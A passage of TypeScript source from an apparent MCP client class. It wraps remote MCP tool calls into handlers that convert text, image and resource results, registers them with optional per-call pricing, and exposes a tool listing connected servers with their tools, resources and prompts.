        const result = await session.callTool({
          name: toolDef.name,
          arguments: params,
        });

        if (!result?.content) return '';

        const textParts: string[] = [];
        const contentItems: ContentItem[] = [];

        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        for (const c of result.content as any[]) {
          if (c.type === 'text' && c.text) {
            textParts.push(c.text);
          } else if (c.type === 'image' && c.data) {
            contentItems.push(ensureContentId({
              type: 'image',
              image: `data:${c.mimeType || 'image/png'};base64,${c.data}`,
            } as ImageContent));
          } else if (c.type === 'resource' && c.resource?.uri) {
            textParts.push(`[Resource: ${c.resource.uri}]`);
          }
        }

        if (contentItems.length > 0) {
          console.log(`[mcp] tool ${toolName} returning ${contentItems.length} content_items`);
          return { text: textParts.join('\n'), content_items: contentItems } as StructuredToolResult;
        }
        return textParts.join('\n');
      } catch (e) {
        return `Error executing tool ${toolName}: ${e}`;
      }
    };

    const toolObj: Tool = {
      name: toolName,
      description: toolDef.description ?? `MCP tool: ${toolName}`,
      parameters: toolDef.inputSchema as Tool['parameters'],
      enabled: true,
      handler,
      ...(pricing?.creditsPerCall && {
        pricing: {
          creditsPerCall: pricing.creditsPerCall,
          reason: pricing.reason ?? `MCP tool: ${toolName}`,
        } satisfies PricingConfig,
      }),
    };

    this.registerTool(toolObj);
  }

  // =========================================================================
  // Exposed tools
  // =========================================================================

  @tool({
    name: 'list_mcp_servers',
    description: 'List connected MCP servers and their available tools, resources, and prompts.',
  })
  async listServers(
    _params: Record<string, unknown>,
    _context: Context,
  ): Promise<Record<string, unknown>> {
    const servers: Record<string, unknown> = {};

    for (const [name, session] of this.sessions) {
      const toolNames: string[] = [];
      for (const [qualifiedName, entry] of this.toolsRegistry) {
        if (entry.server === name) {
          toolNames.push(qualifiedName);
        }
      }

      servers[name] = {
        connected: !!session,
        tools: toolNames,
        resources: (this.resources.get(name) ?? []).map((r) => ({
          uri: r.uri,
          name: r.name,
          description: r.description,
        })),
        prompts: (this.mcpPrompts.get(name) ?? []).map((p) => ({
          name: p.name,
          description: p.description,
          arguments: p.arguments,
        })),
      };
    }

    return { servers, total_servers: this.sessions.size, total_tools: this.toolsRegistry.size };
  }
}
